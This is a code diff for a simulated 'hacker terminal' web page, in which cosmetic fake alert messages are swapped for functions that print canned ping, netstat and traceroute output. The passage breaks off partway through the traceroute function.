-            if (!isHacking && Math.random() > 0.7) {
-                const activities = [
-                    '[MONITOR] Intercepted data packet from 192.168.1.23',
-                    '[ALERT] Suspicious activity detected on port 8080',
-                    '[TRACE] Connection established with proxy server',
-                    '[LOG] Memory dump completed - 2.3GB analyzed',
-                    '[SCAN] New vulnerability discovered: CVE-2024-' + Math.floor(Math.random() * 9999)
-                ];
-                addTerminalLine(activities[Math.floor(Math.random() * activities.length)]);
+            
+            const target = args[args.length - 1];
+            let output = `PING ${target} (142.250.191.14): 56 data bytes\n`;
+            
+            for (let i = 0; i < 4; i++) {
+                const time = (Math.random() * 50 + 10).toFixed(1);
+                output += `64 bytes from 142.250.191.14: icmp_seq=${i} ttl=117 time=${time} ms\n`;
             }
-        }, 8000);
+            
+            output += `--- ${target} ping statistics ---\n`;
+            output += `4 packets transmitted, 4 received, 0% packet loss\n`;
+            output += `round-trip min/avg/max/stddev = 12.4/28.7/45.2/13.8 ms`;
+            
+            return output;
+        }
 
-        // Auto-add code snippets
-        setInterval(addCodeSnippet, 12000);
+        function simulateNetstat(args) {
+            let output = `Active Internet connections (only servers)\n`;
+            output += `Proto Recv-Q Send-Q Local Address           Foreign Address         State\n`;
+            output += `tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n`;
+            output += `tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN\n`;
+            output += `tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n`;
+            output += `tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN\n`;
+            output += `tcp        0      0 192.168.1.100:45678     74.125.224.72:443       ESTABLISHED\n`;
+            output += `udp        0      0 0.0.0.0:53              0.0.0.0:*\n`;
+            return output;
+        }
 
-        // Random IP updates
-        setInterval(() => {
-            const targetIp = document.getElementById('target-ip');
-            const newIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-            targetIp.textContent = newIp;
-        }, 15000);
-
-        // Initial code snippet
-        addCodeSnippet();
-    </script>
-</body>
-</html>
+        function simulateTraceroute(args) {
+            if (!args || args.length === 0) {
+                return 'Usage: traceroute [options] host';
+            }
+            
+            const target = args[args.length - 1];
+            let output = `traceroute to ${target} (142.250.191.14), 30 hops max, 60 byte packets\n`;
+            
+            const hops = [
+                '1  192.168.1.1 (192.168.1.1)  1.234 ms  1.123 ms  1.456 ms',
+                '2  10.0.0.1 (10.0.0.1)  12.567 ms  11.234 ms  13.789 ms',
+                '3  203.134.55.1 (203.134.55.1)  25.678 ms  24.123 ms  26.456 ms',
+                '4  72.14.232.85 (72.14.232.85)  28.234 ms  27.567 ms  29.123 ms',
+                '5
